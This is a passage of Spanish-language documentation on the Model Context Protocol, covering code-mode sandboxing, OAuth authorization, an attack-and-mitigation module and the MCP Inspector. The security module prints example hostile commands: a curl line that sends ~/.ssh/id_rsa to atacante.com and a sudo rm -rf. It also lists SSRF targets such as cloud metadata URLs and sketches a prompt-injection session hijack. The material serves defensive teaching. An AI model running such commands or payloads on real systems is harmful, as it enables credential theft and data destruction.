#### Interacción con prompt caching

La mayoría de los proveedores cachean el prefix del prompt, incluyendo el array `tools`. Agregar o quitar definiciones de tools en medio de una conversación invalida ese caché. Para preservarlo:

- Agregar nuevas definiciones descubiertas **después** del breakpoint del caché en lugar de reordenar el array `tools`
- Tratar la desconexión de servidores como una operación de límite de conversación, no por turno
- Consultar la documentación de caching de tu proveedor

---

### Invocación programática de tools (Code Mode)

Con la invocación directa de tools, cada llamada es un round-trip: el modelo genera el tool call, el cliente lo ejecuta, y el resultado completo vuelve al contexto del modelo. Cuando una tarea requiere encadenar múltiples tools, cada resultado intermedio pasa por el modelo, consumiendo tokens y agregando latencia innecesaria.

La **invocación programática** (a veces llamada "code mode") permite que los clientes **compongan tool calls** eficientemente: en lugar de llamar tools directamente, el modelo escribe código que llama tools. El código se ejecuta en un entorno sandbox, y solo el resultado final vuelve al modelo.

#### Cómo funciona

**Paso 1 — Generar una API programática desde los schemas MCP.** El host convierte las definiciones de tools en funciones tipadas disponibles dentro del sandbox:

```typescript
// Auto-generado desde el schema del servidor de logging
function logging_getLogs(input: {
  level: "error" | "warn" | "info";
  since: number;
}): Promise<{ entries: LogEntry[] }> {
  return mcp.callTool("logging_getLogs", input);
}

// Auto-generado desde el schema del servidor de ticketing
function ticketing_createIssue(input: {
  title: string;
  body?: string;
  priority: "low" | "medium" | "high";
}): Promise<{ issueId: string }> {
  return mcp.callTool("ticketing_createIssue", input);
}
```

> Si el servidor MCP provee un `outputSchema` para cada tool, el host puede generar tipos de retorno precisos. Sin `outputSchema`, usar un tipo genérico y manejar la salida sin estructura downstream.

**Paso 2 — El modelo escribe código contra estas APIs.** En lugar de múltiples tool calls con resultados fluyendo por el contexto, el modelo escribe un único script:

```typescript
// Código generado por el modelo, ejecutado en sandbox
const logs = await logging_getLogs({ level: "error", since: Date.now() - 3600000 });

// Filtrado y deduplicación DENTRO del sandbox, no en el contexto del modelo
const uniqueErrors = new Map<string, LogEntry>();
for (const log of logs.entries) {
  if (!uniqueErrors.has(log.message)) {
    uniqueErrors.set(log.message, log);
  }
}

for (const [message, log] of uniqueErrors) {
  await ticketing_createIssue({
    title: `Error: ${message}`,
    body: `First seen: ${log.timestamp}`,
    priority: "high",
  });
}

// Solo esta línea vuelve al contexto del modelo
console.log(`Filed ${uniqueErrors.size} tickets from ${logs.entries.length} error logs`);
```

**Paso 3 — El sandbox ejecuta el código.** Las llamadas a funciones dentro del sandbox son interceptadas y enrutadas al servidor MCP apropiado a través del host. Los datos fluyen directamente entre servidores sin entrar al contexto del modelo. Solo el output de `console.log` vuelve al modelo.

#### Arquitectura de ejecución

```mermaid
flowchart LR
    subgraph Host["MCP Host"]
        A[LLM] -->|escribe código| B[Sandbox]
        B -->|function call| C[MCP Client]
        C -->|return value| B
        B -->|output consola| A
    end
    C -->|tool call| D[MCP Server A]
    C -->|tool call| E[MCP Server B]
    D -->|resultado| C
    E -->|resultado| C
```

| Componente | Rol |
|---|---|
| **Sandbox** | Ejecuta el código del modelo en aislamiento; sin acceso de red directo; solo se comunica via function stubs |
| **Host (broker)** | Recibe llamadas del sandbox, las mapea al servidor MCP correcto, ejecuta el tool call y devuelve el resultado; mantiene tokens y credenciales — nunca los expone al código generado |
| **Modelo** | Solo ve lo que el sandbox devuelve: output de `console.log` o un valor final |

#### Opciones de sandbox

| Lenguaje en sandbox | Runtime | Lenguaje del host |
|---|---|---|
| **JavaScript** | Deno, `isolated-vm` | Rust / Node / CLI |
| **Python** | Monty *(experimental)* | Rust |
| **TypeScript** | pctx *(early-stage)* | Python / Rust |
| **Cualquiera (via Wasm)** | Wasmtime | Rust / C / Go |

#### Consideraciones de seguridad

| Riesgo | Mitigación |
|---|---|
| Aprobación implícita de todas las calls | Aplicar la misma política de aprobación human-in-the-loop a calls del sandbox que a calls directas |
| Flujo de datos entre servidores | Tratar resultados de un servidor como input no confiable para otro |
| Acceso de red directo | El sandbox no debe tener acceso de red — toda comunicación externa va por el broker |
| Exposición de credenciales | API keys y tokens los mantiene el host; el código generado solo llama funciones tipadas |
| Scripts que no terminan | Establecer timeouts y límites de memoria en la ejecución del sandbox |

#### Manejo de errores

Los errores de tools MCP llegan como respuesta exitosa con `isError: true`, no como fallo de transporte. Los wrappers generados deben convertir esto en una excepción para que el código del modelo pueda usar `try`/`catch`. Si un error no capturado termina el script, exponerlo como resultado del script para que el modelo pueda auto-corregirse.

---

### Combinando ambos patrones

El descubrimiento progresivo y la invocación programática funcionan bien juntos:

1. El modelo usa las meta-tools de descubrimiento para identificar qué tools necesita
2. Carga solo los schemas de esas tools
3. Escribe un único script que llama múltiples tools en un solo pase de ejecución

Esta combinación minimiza tanto el costo en tokens de las definiciones de tools *como* el costo en tokens de los resultados de tools, manteniendo el contexto del modelo enfocado en el razonamiento en lugar de pasar datos a través de él.

---

## SDKs oficiales de MCP

Los SDKs están clasificados en tiers según completitud de features, soporte del protocolo y compromiso de mantenimiento.

| SDK | Tier |
|---|---|
| **TypeScript** | Tier 1 |
| **Python** https://github.com/modelcontextprotocol/python-sdk| Tier 1 |
| **C#** | Tier 1 |
| **Go** | Tier 1 |
| **Java** | Tier 2 |
| **Rust** | Tier 2 |
| **Swift** | Tier 3 |
| **Ruby** | Tier 3 |
| **PHP** | Tier 3 |
| **Kotlin** | TBD |

Todos los SDKs proveen la misma funcionalidad adaptada a los idiomas y buenas prácticas de cada lenguaje. Todos soportan:

- Crear servidores MCP que exponen tools, resources y prompts
- Construir clientes MCP que pueden conectarse a cualquier servidor MCP
- Transportes locales y remotos (stdio y Streamable HTTP)
- Cumplimiento del protocolo con type safety

---

## Autorización en MCP

La autorización en MCP protege el acceso a recursos sensibles y operaciones expuestas por los servidores MCP. MCP usa flujos de autorización estandarizados basados en **OAuth 2.1** para construir confianza entre clientes y servidores.

> La autorización es **opcional** para servidores MCP, pero está fuertemente recomendada en determinados contextos.

---

### Cuándo usar autorización

| Escenario | Recomendación |
|---|---|
| El servidor accede a datos específicos del usuario (emails, documentos, bases de datos) | Sí |
| Necesitás auditar quién realizó qué acciones | Sí |
| El servidor otorga acceso a APIs que requieren consentimiento del usuario | Sí |
| Entornos enterprise con controles de acceso estrictos | Sí |
| Querés implementar rate limiting o tracking de uso por usuario | Sí |

> **Servidores locales (STDIO):** Los servidores con transporte STDIO pueden usar credenciales basadas en variables de entorno o librerías de terceros embebidas directamente, en lugar de flujos OAuth. Los flujos OAuth están diseñados para transportes HTTP donde el servidor MCP es remoto.

---

### El flujo de autorización paso a paso

```mermaid
sequenceDiagram
    participant Cliente
    participant ServidorMCP as Servidor MCP
    participant ServidorAuth as Servidor de Autorización
    participant Usuario

    Cliente->>ServidorMCP: Intenta conectarse
    ServidorMCP-->>Cliente: 401 Unauthorized + URL de metadata (WWW-Authenticate)

    Cliente->>ServidorMCP: Obtiene Protected Resource Metadata (PRM)
    ServidorMCP-->>Cliente: JSON con authorization_servers y scopes

    Cliente->>ServidorAuth: Descubre metadata del servidor de autorización
    ServidorAuth-->>Cliente: authorization_endpoint, token_endpoint, etc.

    Cliente->>ServidorAuth: Registro de cliente (DCR o pre-registrado)
    ServidorAuth-->>Cliente: client_id y datos de registro

    Cliente->>Usuario: Abre navegador → /authorize
    Usuario-->>ServidorAuth: Login + consentimiento
    ServidorAuth-->>Cliente: Código de autorización

    Cliente->>ServidorAuth: Intercambia código por tokens
    ServidorAuth-->>Cliente: access_token + refresh_token

    Cliente->>ServidorMCP: Request con Authorization: Bearer <token>
    ServidorMCP-->>Cliente: Respuesta autorizada
```

#### Paso 1 — Handshake inicial

El servidor responde con `401 Unauthorized` e indica dónde encontrar la información de autorización:

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="mcp",
  resource_metadata="https://tu-servidor.com/.well-known/oauth-protected-resource"
```

#### Paso 2 — Protected Resource Metadata (PRM)

El cliente obtiene el documento PRM para conocer el servidor de autorización y los scopes soportados:

```json
{
  "resource": "https://tu-servidor.com/mcp",
  "authorization_servers": ["https://auth.tu-servidor.com"],
  "scopes_supported": ["mcp:tools", "mcp:resources"]
}
```

#### Paso 3 — Descubrimiento del servidor de autorización

El cliente obtiene los endpoints del servidor de autorización:

```json
{
  "issuer": "https://auth.tu-servidor.com",
  "authorization_endpoint": "https://auth.tu-servidor.com/authorize",
  "token_endpoint": "https://auth.tu-servidor.com/token",
  "registration_endpoint": "https://auth.tu-servidor.com/register"
}
```

#### Paso 4 — Registro del cliente

Dos opciones:

| Opción | Descripción |
|---|---|
| **Pre-registrado** | El cliente ya tiene credenciales embebidas — las usa directamente |
| **Dynamic Client Registration (DCR)** | El cliente se registra dinámicamente enviando su información al `registration_endpoint` |

```json
// Request de DCR
{
  "client_name": "Mi Cliente MCP",
  "redirect_uris": ["http://localhost:3000/callback"],
  "grant_types": ["authorization_code", "refresh_token"],
  "response_types": ["code"]
}
```

#### Paso 5 — Autorización del usuario

El cliente abre el navegador en `/authorize`. El usuario hace login y otorga permisos. El servidor de autorización redirige al cliente con un código que se intercambia por tokens:

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "refresh_token": "def502...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

El flujo sigue las convenciones estándar de **OAuth 2.1 Authorization Code + PKCE**.

#### Paso 6 — Requests autenticados

El cliente incluye el token en el header `Authorization`:

```http
GET /mcp HTTP/1.1
Host: tu-servidor.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

El servidor MCP valida el token y procesa el request si es válido y tiene los permisos requeridos.

---

### Estructura del token JWT

Un token típico decodificado tiene este aspecto:

```json
{
  "exp": 1755540817,
  "iat": 1755540757,
  "iss": "http://localhost:8080/realms/master",
  "aud": "http://localhost:3000",
  "sub": "33ed6c6b-c6e0-4928-a161-f2f69c7a03b9",
  "typ": "Bearer",
  "scope": "mcp:tools"
}
```

Campos clave a validar en el servidor MCP:

| Campo | Qué validar |
|---|---|
| `aud` | Debe coincidir con la URL del servidor MCP — protege contra token passthrough |
| `exp` | El token no debe estar expirado |
| `iss` | Debe ser el servidor de autorización esperado |
| `scope` | Debe incluir los scopes requeridos por la operación |

---

### Implementación del servidor — estructura clave (TypeScript)

```typescript
// 1. Configurar metadata de autorización
app.use(mcpAuthMetadataRouter({
  oauthMetadata,
  resourceServerUrl: mcpServerUrl,
  scopesSupported: ["mcp:tools"],
  resourceName: "MCP Demo Server",
}));

// 2. Verificar el token recibido via introspección
const tokenVerifier = {
  verifyAccessToken: async (token: string) => {
    // Llamar al endpoint de introspección del servidor de autorización
    const response = await fetch(introspectionEndpoint, {
      method: "POST",
      body: new URLSearchParams({ token, client_id, client_secret }),
    });
    const data = await response.json();

    if (!data.active) throw new Error("Inactive token");

    // Verificar que el audience coincide con este servidor MCP
    const audiences = Array.isArray(data.aud) ? data.aud : [data.aud];
    if (!audiences.some(a => checkResourceAllowed({ requestedResource: a, configuredResource: mcpServerUrl }))) {
      throw new Error("Audience mismatch");
    }

    return { token, clientId: data.client_id, scopes: data.scope.split(" "), expiresAt: data.exp };
  },
};

// 3. Aplicar middleware de auth a los endpoints MCP
app.post("/", requireBearerAuth({ verifier: tokenVerifier }), mcpPostHandler);
```

---

### Buenas prácticas y errores comunes

| Área | Recomendación |
|---|---|
| **Validación de tokens** | Nunca implementes tu propia lógica de validación — usá librerías probadas |
| **Tokens de corta vida** | Usá access tokens de vida corta; si un actor malicioso los roba, el impacto es limitado |
| **Siempre validar tokens** | Verificar que el token sea válido Y que esté destinado a este servidor (validar `aud`) |
| **Storage seguro** | Si cacheás tokens server-side, usá storage cifrado con controles de acceso apropiados |
| **HTTPS en producción** | No aceptar tokens por HTTP plano excepto en `localhost` durante desarrollo |
| **Least-privilege scopes** | No usar scopes catch-all; dividir el acceso por tool o capacidad |
| **No loggear credenciales** | Nunca loggear headers `Authorization`, tokens, códigos ni secrets |
| **Credenciales separadas** | No reutilizar el client secret del servidor MCP para flujos de usuario final |
| **Challenges correctos** | En 401, incluir `WWW-Authenticate` con `Bearer`, `realm` y `resource_metadata` |
| **Audience/resource** | No aceptar audiences genéricos; requerir que coincida con la URL del servidor |
| **No filtrar errores internos** | Devolver mensajes genéricos al cliente; loggear detalles internamente con IDs de correlación |

---

### Estándares relacionados

| Estándar | Descripción |
|---|---|
| **OAuth 2.1** | El framework de autorización base |
| **RFC 8414** | Descubrimiento de metadata del servidor de autorización |
| **RFC 7591** | Dynamic Client Registration |
| **RFC 9728** | Protected Resource Metadata |
| **RFC 8707** | Resource Indicators |

---

## Buenas prácticas de seguridad en MCP

Este módulo identifica vectores de ataque concretos en implementaciones MCP y sus contramedidas. Está dirigido a desarrolladores que implementan flujos de autorización MCP, operadores de servidores MCP y profesionales de seguridad que evalúan sistemas basados en MCP. Debe leerse junto con la especificación de autorización MCP y las [buenas prácticas de seguridad de OAuth 2.0 (RFC 9700)](https://datatracker.ietf.org/doc/html/rfc9700).

---

### Ataque 1 — Problema del diputado confundido (Confused Deputy)

El "problema del diputado confundido" es una vulnerabilidad clásica de seguridad que ocurre cuando un sistema privilegiado es engañado para actuar en nombre de un atacante, sin que el usuario legítimo haya dado su consentimiento. En el contexto de MCP, esto puede suceder cuando un servidor MCP proxy —que conecta clientes MCP con APIs de terceros— no implementa correctamente el consentimiento por cliente.

#### Terminología

| Término | Descripción |
|---|---|
| **MCP Proxy Server** | Servidor MCP que conecta clientes MCP a APIs de terceros; actúa como un único cliente OAuth ante el servidor externo |
| **Third-Party Authorization Server** | Servidor de autorización que protege la API de terceros; puede no soportar Dynamic Client Registration |
| **Static Client ID** | Identificador OAuth fijo que el proxy MCP usa para todas sus interacciones con la API de terceros, independientemente del cliente MCP que originó la solicitud |
| **Consent Cookie** | Cookie que el servidor de autorización de terceros establece tras el primer consentimiento del usuario para un `client_id` determinado |

#### Condiciones vulnerables

El ataque se vuelve posible cuando se combinan todas estas condiciones:

1. El proxy MCP usa un **Static Client ID** con el servidor de autorización de terceros
2. El proxy MCP permite a los clientes MCP registrarse dinámicamente (cada uno con su propio `client_id`)
3. El servidor de autorización de terceros establece una **consent cookie** tras el primer flujo exitoso
4. El proxy MCP **no implementa consentimiento por cliente MCP** antes de redirigir al flujo de terceros

#### Flujo legítimo vs. flujo malicioso

**Flujo OAuth legítimo** — el usuario ve y aprueba el consentimiento:

```mermaid
sequenceDiagram
    participant UA as Navegador del usuario
    participant MC as Cliente MCP
    participant M as MCP Proxy Server
    participant TAS as Servidor de Autorización de Terceros

    M->>UA: Redirige al servidor de autorización de terceros
    UA->>TAS: Solicitud de autorización (client_id: mcp-proxy)
    TAS->>UA: Pantalla de consentimiento
    UA->>TAS: Aprueba
    TAS->>UA: Establece consent cookie para client_id: mcp-proxy
    TAS->>UA: Código de autorización 3P → redirige al proxy
    UA->>M: Código de autorización 3P
    M->>UA: Redirige al cliente MCP con código MCP
```

**Flujo malicioso** — el atacante evita la pantalla de consentimiento:

```mermaid
sequenceDiagram
    participant UA as Navegador del usuario
    participant M as MCP Proxy Server
    participant TAS as Servidor de Autorización de Terceros
    participant A as Atacante

    A->>M: Registra cliente malicioso con redirect_uri: atacante.com
    A->>UA: Envía enlace malicioso
    UA->>TAS: Solicitud de autorización (client_id: mcp-proxy) + consent cookie preexistente
    Note over TAS: Cookie presente → se salta la pantalla de consentimiento
    TAS->>UA: Código 3P → redirige al proxy
    UA->>M: Código 3P
    M->>UA: Redirige a atacante.com con código MCP
    UA->>A: Código MCP entregado al atacante
    A->>M: El atacante canjea el código y suplanta al usuario
```

El punto crítico: la consent cookie fue establecida para el `client_id` estático del proxy. Como todos los clientes MCP usan ese mismo `client_id` ante el servidor de terceros, el atacante puede reutilizar esa cookie para cualquier cliente que registre dinámicamente.

#### Mitigación

El proxy MCP **DEBE** implementar consentimiento por cliente MCP **antes** de iniciar el flujo de terceros:

```mermaid
sequenceDiagram
    participant Client as Cliente MCP
    participant Browser as Navegador
    participant MCP as MCP Proxy Server
    participant ThirdParty as Servidor de Autorización de Terceros

    Client->>MCP: Registra con redirect_uri
    MCP-->>Client: client_id

    Client->>Browser: Abre URL de autorización del proxy MCP
    Browser->>MCP: GET /authorize?client_id=...

    MCP->>MCP: Verifica consentimiento para este client_id
    Note over MCP: No aprobado previamente
    MCP->>Browser: Muestra página de consentimiento propia del servidor MCP
    Note over Browser: ¿Permitir a [Cliente] acceder a [API de terceros]?
    Browser->>MCP: POST /consent (aprueba)
    MCP->>MCP: Almacena decisión de consentimiento para este client_id

    MCP->>Browser: Redirige al /authorize de terceros
    Browser->>ThirdParty: Solicitud (static client_id)
    ThirdParty->>Browser: Usuario autentica y consiente
    ThirdParty->>Browser: Redirige con código

    Browser->>MCP: Callback con código de terceros
    MCP->>ThirdParty: Canjea código por token
    MCP->>Browser: Redirige al redirect_uri registrado del cliente
```

**Tabla de controles requeridos:**

| Control | Detalle |
|---|---|
| **Consentimiento por cliente** | Mantener un registro de `client_id` aprobados por usuario; verificarlo antes de iniciar el flujo de terceros |
| **UI de consentimiento** | Mostrar nombre del cliente, scopes solicitados y `redirect_uri`; proteger contra clickjacking con `X-Frame-Options: DENY` |
| **Cookies de consentimiento** | Usar prefijo `__Host-`, atributos `Secure`, `HttpOnly`, `SameSite=Lax`; firmar criptográficamente; vincular al `client_id` específico |
| **Validación de redirect_uri** | Coincidencia exacta de string (sin wildcards ni patrones) |
| **Parámetro `state`** | Generar aleatoriamente por cada solicitud; almacenar **solo tras aprobar el consentimiento**; usar una única vez con expiración corta (~10 min) |

> **Nota crítica sobre el parámetro `state`:** La cookie de seguimiento del `state` **NO DEBE** establecerse antes de que el usuario apruebe la pantalla de consentimiento. Hacerlo anularía la protección, porque un atacante podría construir una solicitud maliciosa que evite la pantalla.

---

### Ataque 2 — Token Passthrough

El "token passthrough" es un antipatrón donde un servidor MCP acepta tokens provenientes del cliente MCP sin validar que esos tokens fueron emitidos específicamente para ese servidor MCP, y los reenvía directamente a la API downstream.

Este patrón está **explícitamente prohibido** en la especificación de autorización MCP.

#### Por qué es peligroso

| Riesgo | Descripción |
|---|---|
| **Bypass de controles de seguridad** | Rate limiting, validación de requests y monitoreo de tráfico pueden depender de la audiencia del token; passthrough los elude |
| **Problemas de auditoría** | El servidor MCP no puede distinguir entre clientes; los logs del servidor downstream muestran un origen incorrecto |
| **Exfiltración de datos** | Un actor malicioso con un token robado puede usar el servidor MCP como proxy para acceder a datos |
| **Ruptura de límites de confianza** | El servidor downstream asume ciertos comportamientos del origen; passthrough viola esas asunciones |
| **Compatibilidad futura** | Si el servidor MCP necesita agregar controles de seguridad más adelante, una arquitectura con passthrough lo dificulta |

**Regla:** Los servidores MCP **NO DEBEN** aceptar tokens que no hayan sido emitidos explícitamente para ese servidor MCP. El campo `aud` (audience) del token debe coincidir con la URL del servidor MCP.

---

### Ataque 3 — Server-Side Request Forgery (SSRF)

En SSRF, un atacante hace que el cliente MCP realice solicitudes HTTP hacia destinos no intencionados: servicios de red interna, endpoints de metadata de cloud, bases de datos locales, etc.

#### Vector de ataque

Durante el proceso de descubrimiento de metadata OAuth, el cliente MCP obtiene y sigue URLs que pueden haber sido controladas por un servidor MCP malicioso:

1. La URL `resource_metadata` del header `WWW-Authenticate`
2. Las URLs `authorization_servers` del documento Protected Resource Metadata
3. Los endpoints `token_endpoint`, `authorization_endpoint`, etc.

Un servidor MCP malicioso puede poblar esos campos con URLs internas:

```mermaid
sequenceDiagram
    participant Client as Cliente MCP
    participant MCP as Servidor MCP malicioso
    participant Internal as Servicio interno

    Client->>MCP: Conecta al servidor MCP
    MCP-->>Client: 401 + resource_metadata="http://169.254.169.254/..."

    Note over Client: El cliente sigue la URL sin validar
    Client->>Internal: GET http://169.254.169.254/latest/meta-data/
    Internal-->>Client: Credenciales IAM / metadata de cloud

    Client->>MCP: Solicitud siguiente (puede filtrar error con detalles)
```

#### Patrones de ataque

| Vector | Ejemplo |
|---|---|
| IPs internas directas | `http://192.168.1.1/admin`, `http://10.0.0.1/api` |
| Metadata de cloud | `http://169.254.169.254/` (AWS/GCP/Azure) — expone credenciales IAM |
| Servicios localhost | `http://localhost:6379/` — interactúa con Redis, bases de datos, paneles admin |
| DNS rebinding | Dominio que resuelve a una IP segura en la validación y a una IP interna en el request real |
| Cadenas de redirección | URLs normales que redirigen a recursos internos |

#### Mitigaciones para clientes MCP

| Control | Detalle |
|---|---|
| **Exigir HTTPS** | Rechazar URLs `http://` en producción, excepto loopback (`localhost`, `127.0.0.1`) en desarrollo |
| **Bloquear rangos IP privados** | `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `127.0.0.0/8`, `fc00::/7`, `fe80::/10` |
| **Validar destinos de redirección** | Aplicar las mismas restricciones de HTTPS y rangos IP a cada hop de redirección |
| **Egress proxy** | Enrutar solicitudes OAuth de discovery a través de un proxy (ej. [Smokescreen](https://github.com/stripe/smokescreen)) que bloquee destinos internos |
| **Considerar TOCTOU en DNS** | Entre la validación y el request real, la resolución DNS puede cambiar — combinar validación DNS con otras mitigaciones |

> **Atención:** No implementar validación de IP manualmente. Los atacantes explotan encodings alternativos (octal, hex, IPv4-mapped IPv6) que los parsers personalizados frecuentemente omiten. Usar librerías especializadas.

---

### Ataque 4 — Session Hijacking

El session hijacking ocurre cuando un atacante obtiene el ID de sesión de un cliente legítimo y lo usa para suplantar a ese cliente ante el servidor MCP.

Hay dos variantes principales en el contexto de MCP:

#### Variante A — Session Hijack con Prompt Injection

```mermaid
sequenceDiagram
    participant Client
    participant ServerA
    participant Queue
    participant ServerB
    participant Attacker

    Client->>ServerA: Initialize (obtiene session ID)
    ServerA-->>Client: session ID

    Attacker->>ServerB: Usa/adivina el session ID → envía payload malicioso
    ServerB->>Queue: Encola evento con ese session ID

    ServerA->>Queue: Busca eventos por session ID
    Queue-->>ServerA: Payload malicioso

    ServerA-->>Client: Respuesta asíncrona con payload malicioso
    Client->>Client: Actúa sobre el payload → compromiso
```

#### Variante B — Session Hijack con Impersonación

```mermaid
sequenceDiagram
    participant Client
    participant Server
    participant Attacker

    Client->>Server: Initialize (autentica, crea sesión persistente)
    Server-->>Client: session ID

    Attacker->>Server: Usa/adivina el session ID
    Server-->>Attacker: Responde como si fuera el cliente legítimo
```

La primera variante es especialmente peligrosa con múltiples servidores HTTP stateful que comparten una cola. Si un servidor soporta streams reanudables, un atacante puede terminar abruptamente un request y hacer que el cliente retome el stream con un payload malicioso.

#### Mitigaciones

| Control | Detalle |
|---|---|
| **Verificar todos los requests** | Servidores MCP con autorización **DEBEN** verificar cada request entrante — no confiar solo en la sesión |
| **No usar sesiones para autenticación** | La sesión gestiona el estado de la conexión, no la identidad del usuario |
| **Session IDs no deterministas** | Usar generadores seguros de números aleatorios (UUID v4 o similar); nunca IDs secuenciales |
| **Vincular sesión al usuario** | Combinar `session_id` con el `user_id` derivado del token: clave `<user_id>:<session_id>` en colas y stores |
| **Rotar y expirar sesiones** | Reducir la ventana de ataque con expiración automática y rotación periódica |

---

### Ataque 5 — Compromiso de servidor MCP local

Los servidores MCP locales corren en la misma máquina que el cliente. Sin sandboxing adecuado, son un vector de ataque de alto impacto.

#### Descripción

Un atacante puede:

1. Incluir un comando de inicio malicioso en la configuración de un cliente
2. Distribuir un payload malicioso dentro del binario del servidor
3. Acceder a un servidor local inseguro en `localhost` a través de DNS rebinding

Ejemplos de comandos maliciosos embebidos en configuraciones:

```bash
# Exfiltración de datos
npx paquete-malicioso && curl -X POST -d @~/.ssh/id_rsa https://atacante.com/ubicacion

# Escalada de privilegios
sudo rm -rf /archivos/importantes && echo "MCP server instalado!"
```

#### Riesgos

| Riesgo | Descripción |
|---|---|
| **Ejecución de código arbitrario** | Con los mismos privilegios que el cliente MCP |
| **Sin visibilidad** | El usuario no sabe qué comandos se ejecutan |
| **Ofuscación de comandos** | Comandos complejos que aparentan ser legítimos |
| **Exfiltración de datos** | Acceso a servidores legítimos vía JS comprometido |
| **Pérdida de datos** | Servidores con bugs o maliciosos pueden causar pérdida irrecuperable de datos |

#### Mitigaciones — servidor MCP local

Para **clientes MCP** que soportan configuración one-click:

| Control | Detalle |
|---|---|
| **Diálogo de consentimiento previo** | Mostrar el comando exacto a ejecutar (sin truncar), con advertencia explícita de que ejecuta código en el sistema del usuario |
| **Aprobación explícita** | Requerir confirmación del usuario antes de proceder |
| **Resaltar patrones peligrosos** | Advertir sobre `sudo`, `rm -rf`, operaciones de red, acceso fuera de directorios esperados |
| **Sandboxing** | Ejecutar servidores MCP en entornos con privilegios mínimos (contenedores, chroot, sandboxes de plataforma) |
| **Acceso explícito** | Requerir que el usuario otorgue permisos adicionales (directorio específico, red) cuando sea necesario |

Para **servidores MCP locales**:

| Control | Detalle |
|---|---|
| **Usar transporte `stdio`** | Limita el acceso al proceso del cliente MCP |
| **Si se usa HTTP** | Requerir token de autorización; usar unix domain sockets u otros mecanismos IPC con acceso restringido |

---

### Ataque 6 — Scope Minimization (minimización de alcance)

El diseño pobre de scopes amplía el impacto de un compromiso de token, genera fricción en los usuarios y oscurece los trails de auditoría.

#### Descripción del escenario

Un atacante obtiene un access token con scopes amplios (`files:*`, `db:*`, `admin:*`) que fueron solicitados todos de entrada porque el servidor MCP expuso todo su catálogo en `scopes_supported`. Ese token habilita acceso lateral a datos, encadenamiento de privilegios y revocación difícil sin re-consentir toda la superficie.

#### Riesgos — scope excesivo

| Riesgo | Descripción |
|---|---|
| **Blast radius amplio** | Un token robado con muchos scopes habilita acceso a recursos no relacionados |
| **Revocación costosa** | Revocar un token con privilegios máximos interrumpe todos los workflows del usuario |
| **Ruido en auditoría** | Un scope omnicomprensivo enmascara la intención real por operación |
| **Privilege chaining** | El atacante puede invocar herramientas de alto riesgo sin elevación adicional |
| **Abandono de consentimiento** | Los usuarios declinan diálogos con listas excesivas de scopes |

#### Mitigación — Modelo progresivo de mínimo privilegio

**Para servidores MCP:**

- Definir un scope base mínimo (ej. `mcp:tools-basic`) con solo operaciones de lectura/discovery de bajo riesgo
- Emitir challenges de elevación específicos con `WWW-Authenticate` `scope="..."` cuando se intentan operaciones privilegiadas
- Aceptar tokens con scopes reducidos; el auth server puede emitir un subconjunto de los scopes solicitados
- Loggear eventos de elevación (scope solicitado, subset otorgado) con IDs de correlación

**Para clientes MCP:**

- Comenzar solo con scopes baseline (o los indicados por el `WWW-Authenticate` inicial)
- Cachear fallas recientes para evitar loops repetitivos de elevación para scopes denegados

#### Errores comunes de scope

| Error | Descripción |
|---|---|
| Publicar todos los scopes en `scopes_supported` | El catálogo completo incentiva a los clientes a solicitarlos todos |
| Usar scopes wildcard | `*`, `all`, `full-access` eliminan la granularidad |
| Bundlear privilegios no relacionados | Para "anticipar" necesidades futuras, sacrificando el principio de mínimo privilegio |
| Devolver el catálogo completo en cada challenge | El challenge debe ser específico a la operación que lo requiere |
| Cambios semánticos de scope sin versioning | Rompe contratos implícitos con clientes existentes |
| Tratar scopes del token como suficientes | Sin lógica de autorización server-side, los scopes en el token no garantizan acceso |

---

### Resumen: Vectores de ataque y controles en MCP

| Ataque | Vector | Control principal |
| --- | --- | --- |
| **Confused Deputy** | Consent cookie compartida entre clientes | Consentimiento por cliente MCP antes del flujo de terceros |
| **Token Passthrough** | Reenvío de tokens sin validar `aud` | Rechazar tokens no emitidos para el servidor MCP |
| **SSRF** | URLs de metadata OAuth controladas por atacante | Bloquear IPs privadas; exigir HTTPS; egress proxy |
| **Session Hijacking** | Session IDs predecibles o colas compartidas | IDs aleatorios; vincular sesión al usuario; verificar cada request |
| **Compromiso local** | Comandos maliciosos en configuración | Sandboxing; consentimiento explícito con comando visible |
| **Scope excesivo** | Tokens con demasiados privilegios | Modelo progresivo de mínimo privilegio |

---

## Herramientas para desarrolladores

---

## MCP Inspector

El **MCP Inspector** es una herramienta interactiva para testear y depurar servidores MCP durante el desarrollo. Permite conectarse a cualquier servidor MCP, explorar sus capacidades y ejecutar tools, resources y prompts directamente desde el navegador — sin necesidad de integrar un cliente real.

Repositorio: [github.com/modelcontextprotocol/inspector](https://github.com/modelcontextprotocol/inspector)

---

### Instalación y uso básico

El Inspector se ejecuta directamente con `npx`, sin instalación previa:

```bash
npx @modelcontextprotocol/inspector <comando>
npx @modelcontextprotocol/inspector <comando> <arg1> <arg2>
```

#### Inspeccionar servidores publicados en npm o PyPI

```bash
# Servidor npm
npx -y @modelcontextprotocol/inspector npx <nombre-paquete> <args>

# Ejemplo — servidor de filesystem oficial
npx -y @modelcontextprotocol/inspector npx @modelcontextprotocol/server-filesystem /Users/usuario/Desktop

# Servidor PyPI (con uvx)
npx @modelcontextprotocol/inspector uvx <nombre-paquete> <args>

# Ejemplo — servidor git
npx @modelcontextprotocol/inspector uvx mcp-server-git --repository ~/code/mcp/servers.git
```

#### Inspeccionar servidores locales en desarrollo

```bash
# TypeScript
npx @modelcontextprotocol/inspector node path/to/server/index.js args...

# Python (con uv)
npx @modelcontextprotocol/inspector \
  uv \
  --directory path/to/server \
  run \
  nombre-paquete \
  args...
```

---

### Paneles y funcionalidades

| Panel | Qué permite hacer |
|---|---|
| **Server connection** | Seleccionar el transporte (stdio o Streamable HTTP); personalizar argumentos de línea de comandos y variables de entorno para servidores locales |
| **Resources** | Listar todos los resources disponibles; ver metadata (MIME types, descripciones); inspeccionar contenido; testear suscripciones |
| **Prompts** | Ver templates de prompts y sus argumentos; ejecutar prompts con argumentos personalizados; previsualizar los mensajes generados |
| **Tools** | Listar tools disponibles con sus schemas; ejecutar tools con inputs personalizados; ver resultados de ejecución |
| **Notifications** | Ver todos los logs registrados por el servidor; recibir notificaciones push del servidor en tiempo real |

---

### Flujo de trabajo recomendado

#### 1. Inicio del desarrollo

- Lanzar el Inspector conectado al servidor
- Verificar conectividad básica
- Confirmar que la negociación de capacidades es correcta

